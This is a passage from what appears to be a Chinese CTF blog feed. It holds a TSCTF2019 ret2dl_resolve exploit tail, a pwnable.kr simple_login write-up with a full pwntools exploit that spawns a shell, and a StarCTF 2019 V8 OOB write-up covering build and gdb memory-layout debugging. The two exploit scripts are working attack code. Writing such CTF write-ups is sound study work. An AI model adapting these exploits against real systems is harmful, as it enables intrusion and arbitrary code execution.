hex(rel_plt))</span><br><span class="line">dynsym = <span class="number">0x4002B8</span></span><br><span class="line">log.success(<span class="string">'dynsym =&gt; '</span> + hex(dynsym))</span><br><span class="line">dynstr = <span class="number">0x400318</span></span><br><span class="line">log.success(<span class="string">'dynstr =&gt; '</span> + hex(dynstr))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#addr_stage 0x602040</span></span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">fake_rel_addr = addr_stage + <span class="number">0x300</span></span><br><span class="line">fake_sym_addr = addr_stage + <span class="number">0x340</span></span><br><span class="line">index_offset = (fake_rel_addr - rel_plt) / <span class="number">0x18</span><span class="comment">#fake index of rel</span></span><br><span class="line">r_offset = main_got</span><br><span class="line">r_addend = p64(<span class="number">0</span>)</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) </span><br><span class="line">padding = <span class="number">0x18</span> - ((fake_sym_addr-dynsym) % <span class="number">0x18</span>)</span><br><span class="line">fake_sym_addr += padding</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">fake_str_addr = fake_sym_addr + <span class="number">24</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line">r_info = (((fake_sym_addr - dynsym) / <span class="number">0x18</span>) &lt;&lt; <span class="number">0x20</span>) | <span class="number">0x7</span></span><br><span class="line">fake_rel = p64(r_offset) + p64(r_info) + r_addend</span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">addr_cmd = fake_str_addr + <span class="number">7</span></span><br><span class="line">st_name = fake_str_addr - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0x12</span>) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">buf = p64(pop_rdi_ret) + p64(addr_cmd)</span><br><span class="line">buf += p64(plt0) + p64(index_offset)</span><br><span class="line">buf = buf.ljust(<span class="number">0x300</span>,<span class="string">'b'</span>)</span><br><span class="line">buf += fake_rel</span><br><span class="line">buf = buf.ljust(<span class="number">0x340</span>,<span class="string">'b'</span>)</span><br><span class="line">buf += <span class="string">'c'</span>*padding</span><br><span class="line">buf += fake_sym</span><br><span class="line">buf += <span class="string">'system\x00'</span></span><br><span class="line">buf += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">buf = buf.ljust(<span class="number">0x500</span>,<span class="string">'b'</span>)</span><br><span class="line">p.send(buf)</span><br><span class="line">raw_input()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>TSCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable.kr-&gt;Simple Login</title>
    <url>/2020/09/03/simple_login/</url>
    <content><![CDATA[<h1 id="pwnable-kr-gt-simple-login"><a href="#pwnable-kr-gt-simple-login" class="headerlink" title="pwnable.kr-&gt;simple_login"></a>pwnable.kr-&gt;simple_login</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个题目是从apple store那里看p4nda学长的wp来的，那道题最后用到了这个题的技巧，因此我也做了一下这个来加深记忆</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>F5之后发现程序的逻辑比较简单，有一个bss段的全局变量input，输入限制长度为30，且根据函数名可以看到输入的数据应当是base64编码之后的结果，之后会先进行一次base64解码，判断解码长度不大于12，在进入auth函数把输入的解码结果memcpy到v4，这里是漏洞的触发点，v4地址为ebp-8，但是输入最长可以是12，因此可以覆盖到ebp，但也只能覆盖ebp。程序里有system调用处，可以在Gdb里直接b*correct找到其地址</p>
<p><img src="/2020/09/03/simple_login/1.jpg" alt="main"></p>
<p><img src="/2020/09/03/simple_login/2.jpg" alt="auth"></p>
<p><img src="/2020/09/03/simple_login/3.jpg" alt="system"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里一个知识点比较关键，我们假设调用函数为A，被调函数为B，则B函数的ebp的值实际上是A函数ebp的地址，因此我们覆盖B函数的ebp时填入一块假的内存块的地址，这个地址的值模拟ebp和返回地址及参数。当被调函数返回的时候ebp被Pop出来作为原函数的ebp地址，最终实现eip劫持</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./login'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x804929c')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9003</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Authenticate : '</span>)</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">shell_addr = <span class="number">0x8049284</span></span><br><span class="line">input_addr = <span class="number">0x811EB40</span></span><br><span class="line">payload = flat(<span class="string">'aaaa'</span>,shell_addr,input_addr)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.kr</category>
      </categories>
  </entry>
  <entry>
    <title>StarCTF 2019 OOB</title>
    <url>/2020/09/03/oob/</url>
    <content><![CDATA[<h1 id="StarCTF-2019-OOB"><a href="#StarCTF-2019-OOB" class="headerlink" title="StarCTF 2019 OOB"></a>StarCTF 2019 OOB</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想多尝试一下不同的东西，这道OOB的资料比较多(后来事实证明只需要看姚老板一人的博客就够了)，所以就花了两天调了一下，exp基本都是亦步亦趋地跟着学长写的，这篇博客算是读书笔记2333。</p>
<h2 id="浏览器pwn常见形式"><a href="#浏览器pwn常见形式" class="headerlink" title="浏览器pwn常见形式"></a>浏览器pwn常见形式</h2><p>看师傅的总结一般有两种形式：出题人给个diff文件，里面有漏洞代码，给定一个漏洞版本的commit，编译前将源码reset到这个版本，再把diff文件apply上去，编译得到二进制文件d8。</p>
<h2 id="编译d8"><a href="#编译d8" class="headerlink" title="编译d8"></a>编译d8</h2><p>折腾环境可以先看下我之前的博客，其实总结一下就是想办法找个好代理后面就没什么大问题了，有谷歌云的也可以那边clone再scp回来不过比较麻烦。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">git apply &lt; oob.diff</span><br><span class="line"><span class="comment"># 同步模块</span></span><br><span class="line">gclient sync</span><br><span class="line"><span class="comment"># 编译debug版本</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br><span class="line"><span class="comment"># 编译release版本</span></span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure>
<p>编译出来的debug版本不能调用漏洞函数oob，只能在release中调用，而我们后面调试东西也不能在release中用job命令(这块很重要因为这个坑我编译了8.1的GDB= =)。所以我们主要是通过debug版本调试数据结构。</p>
<h2 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h2><h3 id="调试工作"><a href="#调试工作" class="headerlink" title="调试工作"></a>调试工作</h3><p><code>allow-natives-syntax选项</code>，启动v8的时候设置这个选项，能定义一些v8运行时的支持函数，便于本地调试。一般gdb调试时先<code>gdb ./d8</code>，在gdb里设置参数<code>set args --allow-natives-syntax ./test.js</code><br>使用<code>%DebugPrint(var)</code>来输出变量var的详细信息，使用<code>%SystemBreak()</code>触发调试中断<br>在编译后的目录下有个gdbinit，是v8官方团队给我们调试用的，在<code>~/.gdbinit</code>source一下那个文件以及目录下的<code>support-v8.py</code>，再重新加载一下gdbinit配置即可在<code>x64.debug</code>中调试<br>常用的命令(本篇用到的)有<code>job</code>和<code>telescope addr [count]</code>，第一个命令可以可视化地显示Javascript对象的内存结构，第二个命令输出某个地址及之后count长度的内存数据  </p>
<h3 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h3><p>编写一个测试脚本test.js，内容如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.3</span>,<span class="number">3.4</span>,<span class="number">4.4</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>];</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>启动gdb调试d8，run之后看下，输出了a的信息,a作为一个JsArray对象，它的地址为<code>0x3bfd46c4de99</code>，注意这里的末位9，v8在内容中只有数字和对象两种表示，为了区分二者，v8在所有对象的内存地址的末尾加了1，表示其为一个对象，因此该对象的实际地址为<code>0x3bfd46c4de8</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x3bfd46c4de99: [JSArray]</span><br><span class="line"> - map: 0x306548ac2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x29277be11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3bfd46c4de69 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x3f5b22f80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x0c7c939401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3bfd46c4de69 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.3</span><br><span class="line">           2: 3.4</span><br><span class="line">           3: 4.4</span><br><span class="line"> &#125;</span><br><span class="line">0x306548ac2ed9: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x306548ac2e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x0c7c93940609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x29277be11f49 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions <span class="comment">#1: 0x29277be11eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x3f5b22f84ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x306548ac2f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x29277be11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x29277be10ec1 &lt;JSFunction Array (sfi = 0xc7c9394aca1)&gt;</span><br><span class="line"> - dependent code: 0x3f5b22f802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Thread 1 <span class="string">"d8"</span> received signal SIGTRAP, Trace/breakpoint <span class="built_in">trap</span>.</span><br></pre></td></tr></table></figure>
<p>我们用job查看一下对象的结构，可以看到对象的起始位置为map(PACKED_DOUBLE_ELEMENTS表明了它对象类型为这个)，实际存放浮点数组元素的地方在elements，我们用telescope查看elements处的元素</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ job 0x3bfd46c4de99</span><br><span class="line">0x3bfd46c4de99: [JSArray]</span><br><span class="line"> - map: 0x306548ac2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x29277be11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3bfd46c4de69 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x3f5b22f80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x0c7c939401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3bfd46c4de69 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.3</span><br><span class="line">           2: 3.4</span><br><span class="line">           3: 4.4</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到elements实际就在JsArray这个对象前面不远的地方，注意elemets也是一个对象(FixedDoubleArray)，实际的元素从<code>elments_addr+0x10</code>开始存储，这里多打了一个元素，即对象a开头的map，可以看到它就在实际存储元素的数组后面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ telescope 0x3bfd46c4de68 </span><br><span class="line">0000| 0x3bfd46c4de68 --&gt; 0x3f5b22f814f9 --&gt; 0x3f5b22f801 </span><br><span class="line">0008| 0x3bfd46c4de70 --&gt; 0x400000000 </span><br><span class="line">0016| 0x3bfd46c4de78 --&gt; 0x3ff199999999999a </span><br><span class="line">0024| 0x3bfd46c4de80 --&gt; 0x4002666666666666 </span><br><span class="line">0032| 0x3bfd46c4de88 (&quot;333333\v@\232\231\231\231\231\231\021@\331.\254He0&quot;)</span><br><span class="line">0040| 0x3bfd46c4de90 --&gt; 0x401199999999999a </span><br><span class="line">0048| 0x3bfd46c4de98 --&gt; 0x306548ac2ed9 --&gt; 0x400003f5b22f801 </span><br><span class="line">0056| 0x3bfd46c4dea0 --&gt; 0x3f5b22f80c71 --&gt; 0x3f5b22f808</span><br><span class="line"></span><br><span class="line">gdb-peda$ job 0x3bfd46c4de69</span><br><span class="line">0x3bfd46c4de69: [FixedDoubleArray]</span><br><span class="line"> - map: 0x3f5b22f814f9 &lt;Map&gt;</span><br><span class="line"> - length: 4</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.3</span><br><span class="line">           2: 3.4</span><br><span class="line">           3: 4.4</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3bfd46c4de78</span><br><span class="line">$1 = 1.1000000000000001</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3bfd46c4de80</span><br><span class="line">$2 = 2.2999999999999998</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3bfd46c4de88</span><br><span class="line">$3 = 3.3999999999999999</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3bfd46c4de90</span><br><span class="line">$4 = 4.4000000000000004</span><br><span class="line">gdb-peda$ p &#123;double&#125; 0x3bfd46c4de98</span><br><span class="line">$5 = 2.6290008240713118e-310</span><br></pre></td></tr></table></figure>
<p>为了对比，我们再找个对象数组(每个元素都是对象)调试查看</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.3</span>,<span class="number">3.4</span>,<span class="number">4.4</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>];</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> c = [a,b];</span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>下面是a的信息，其对象地址为<code>0x15c096a4dee8</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x15c096a4dee9: [JSArray]</span><br><span class="line"> - map: 0x3ab385142ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3a008ae51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x15c096a4deb9 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x03e56e240c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2788f83801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x15c096a4deb9 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.3</span><br><span class="line">           2: 3.4</span><br><span class="line">           3: 4.4</span><br><span class="line"> &#125;</span><br><span class="line">0x3ab385142ed9: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3ab385142e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2788f8380609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3a008ae51f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x3a008ae51eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x03e56e244ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3ab385142f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3a008ae51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3a008ae50ec1 &lt;JSFunction Array (sfi = 0x2788f838aca1)&gt;</span><br><span class="line"> - dependent code: 0x03e56e2402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>
<p>continue，可以看到b的信息。其实际地址为<code>0x15c096a4df48</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x15c096a4df49: [JSArray]</span><br><span class="line"> - map: 0x3ab385142ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3a008ae51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x15c096a4df09 &lt;FixedDoubleArray[6]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 6</span><br><span class="line"> - properties: 0x03e56e240c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2788f83801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x15c096a4df09 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line">           3: 4.4</span><br><span class="line">           4: 5.5</span><br><span class="line">           5: 6.6</span><br><span class="line"> &#125;</span><br><span class="line">0x3ab385142ed9: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3ab385142e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2788f8380609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3a008ae51f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x3a008ae51eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x03e56e244ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3ab385142f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3a008ae51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3a008ae50ec1 &lt;JSFunction Array (sfi = 0x2788f838aca1)&gt;</span><br><span class="line"> - dependent code: 0x03e56e2402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>
<p>最后程序断到c处我们可以看到其地址为<code>0x15c096a4df88</code>,elements的内容是其成员对象的地址，而之前浮点数数组的elements就是它的成员浮点数本身。对比一下浮点数组和对象数组，会发现它们的结构很相似，都是在elements的后面紧接着map，不同的是我们输出floatArr[0]输出的是浮点数，objArr[0]输出的是第一个浮点数数组的全部内容，也就是对象的解析方式不同，在v8里，对象的解析情况由map的值表示，这个根据我们的调试也可以大致推测出来，不同对象数组的map值不同。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x15c096a4df89: [JSArray]</span><br><span class="line"> - map: 0x3ab385142f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3a008ae51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x15c096a4df69 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x03e56e240c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2788f83801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x15c096a4df69 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x15c096a4dee9 &lt;JSArray[4]&gt;</span><br><span class="line">           1: 0x15c096a4df49 &lt;JSArray[6]&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x3ab385142f79: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3ab385142f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2788f8380609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3a008ae51f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x3a008ae51f19 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x03e56e244ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_ELEMENTS) -&gt; 0x3ab385142fc9 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3a008ae51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3a008ae50ec1 &lt;JSFunction Array (sfi = 0x2788f838aca1)&gt;</span><br><span class="line"> - dependent code: 0x03e56e2402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> gdb-peda$ telescope 0x15c096a4df68</span><br><span class="line">0000| 0x15c096a4df68 --&gt; 0x3e56e240801 --&gt; 0x3e56e2401 </span><br><span class="line">0008| 0x15c096a4df70 --&gt; 0x200000000 </span><br><span class="line">0016| 0x15c096a4df78 --&gt; 0x15c096a4dee9 --&gt; 0x7100003ab385142e </span><br><span class="line">0024| 0x15c096a4df80 --&gt; 0x15c096a4df49 --&gt; 0x7100003ab385142e </span><br><span class="line">0032| 0x15c096a4df88 --&gt; 0x3ab385142f79 --&gt; 0x4000003e56e2401 </span><br><span class="line">0040| 0x15c096a4df90 --&gt; 0x3e56e240c71 --&gt; 0x3e56e2408 </span><br><span class="line">0048| 0x15c096a4df98 --&gt; 0x15c096a4df69 --&gt; 0x3e56e2408 </span><br><span class="line">0056| 0x15c096a4dfa0 --&gt; 0x200000000 </span><br><span class="line">gdb-peda$ job 0x15c096a4dee9</span><br><span class="line">0x15c096a4dee9: [JSArray]</span><br><span class="line"> - map: 0x3ab385142ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3a008ae51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x15c096a4deb9 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x03e56e240c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2788f83801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x15c096a4deb9 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.3</span><br><span class="line">           2: 3.4</span><br><span class="line">           3: 4.4</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>我们尝试在gdb中直接修改内存数据，即将对象数组的map强制修改为浮点数组的，并且输出c[0],测试代码如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.3</span>,<span class="number">3.4</span>,<span class="number">4.4</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>];</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> c = [a,b];</span><br><span class="line"><span class="built_in">console</span>.log(c[<span class="number">0</span>]);</span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>一直走到从c，中间记录下floatArr的map为<code>0x3a73fe2c2ed9</code>,对象数组的map为<code>0x3a73fe2c2f79</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.1,2.3,3.4,4.4</span><br><span class="line">DebugPrint: 0x9fc4aa0dfc9: [JSArray]</span><br><span class="line"> - map: 0x3a73fe2c2f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x373fc5a91111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x09fc4aa0dfa9 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x04366f840c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x066f341401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x09fc4aa0dfa9 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x09fc4aa0df29 &lt;JSArray[4]&gt;</span><br><span class="line">           1: 0x09fc4aa0df89 &lt;JSArray[6]&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x3a73fe2c2f79: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3a73fe2c2f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x066f34140609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x373fc5a91f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x373fc5a91f19 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x04366f844ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_ELEMENTS) -&gt; 0x3a73fe2c2fc9 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x373fc5a91111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x373fc5a90ec1 &lt;JSFunction Array (sfi = 0x66f3414aca1)&gt;</span><br><span class="line"> - dependent code: 0x04366f8402c1 &lt;Other heap object 